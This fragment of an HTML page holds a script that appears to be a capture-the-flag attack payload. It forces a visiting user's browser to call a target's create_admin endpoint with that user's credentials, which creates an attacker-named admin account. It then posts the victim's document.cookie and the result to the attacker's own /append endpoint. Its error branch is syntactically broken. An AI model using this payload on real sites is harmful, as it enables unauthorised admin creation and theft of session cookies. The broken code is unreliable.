</head>
<body>

    <script>
        fetch('https://tasks.goidactf.ru:20125/create_admin',
{
    method:'POST',
    headers:{
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin':'https://tasks.goidactf.ru:20125'
        },
    credentials:'include',
    body:'new_admin_login=juuzo'
}).then(r=>{
fetch('/append',{
    method:'POST',
    headers:{
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        cookie:document.cookie,
        headers:Object.fromEntries([...new Headers(document.headers || {})]),
        ip:'xss',
        response:r.status
    })
})
}).catch(err => {
    return fetch("/append", {
      method: "POST",
      headers: { "Content-Type": "application/json" },

        ok: false,
        status: err.status || null,
        error: err.message
      })
    })})
